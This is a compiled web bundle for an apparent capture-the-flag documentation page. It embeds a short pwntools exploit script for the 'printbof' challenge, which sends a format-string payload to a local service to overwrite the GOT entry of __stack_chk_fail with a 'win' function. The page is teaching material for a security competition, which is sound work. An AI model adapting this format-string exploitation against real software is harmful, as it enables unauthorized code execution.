"use strict";(self.webpackChunkictf_docs=self.webpackChunkictf_docs||[]).push([[5072],{5099:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>c,contentTitle:()=>s,default:()=>u,frontMatter:()=>i,metadata:()=>p,toc:()=>a});var r=n(4848),o=n(8453);const i={},s=void 0,p={id:"writeups/printbof/exploit.py",title:"exploit.py",description:"",source:"@site/docs/writeups/printbof/exploit.py.md",sourceDirName:"writeups/printbof",slug:"/writeups/printbof/exploit.py",permalink:"/ictf-docs/writeups/printbof/exploit.py",draft:!1,unlisted:!1,editUrl:"https://github.com/ucsb-seclab/ictf-docs/tree/main/docs/writeups/printbof/exploit.py.md",tags:[],version:"current",frontMatter:{},sidebar:"writeups",previous:{title:"printbof",permalink:"/ictf-docs/writeups/printbof/"},next:{title:"rustyneurone",permalink:"/ictf-docs/writeups/rustyneurone/"}},c={},a=[];function l(e){const t={code:"code",pre:"pre",...(0,o.R)(),...e.components};return(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-python",children:"from pwn import *\r\nfilename = './chal'\r\ncontext.arch = 'amd64'\r\ne = ELF(filename)\r\n#p = process(filename)\r\np = remote('127.0.0.1', 3434)\r\n\r\npayload = fmtstr_payload(6, {e.got['__stack_chk_fail'] : e.sym['win']})\r\npayload += b'a'*(109-len(payload))\r\np.sendline(payload)\r\n\r\np.interactive()\n"})})}function u(e={}){const{wrapper:t}={...(0,o.R)(),...e.components};return t?(0,r.jsx)(t,{...e,children:(0,r.jsx)(l,{...e})}):l(e)}},8453:(e,t,n)=>{n.d(t,{R:()=>s,x:()=>p});var r=n(6540);const o={},i=r.createContext(o);function s(e){const t=r.useContext(i);return r.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function p(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:s(e.components),r.createElement(i.Provider,{value:t},e.children)}}}]);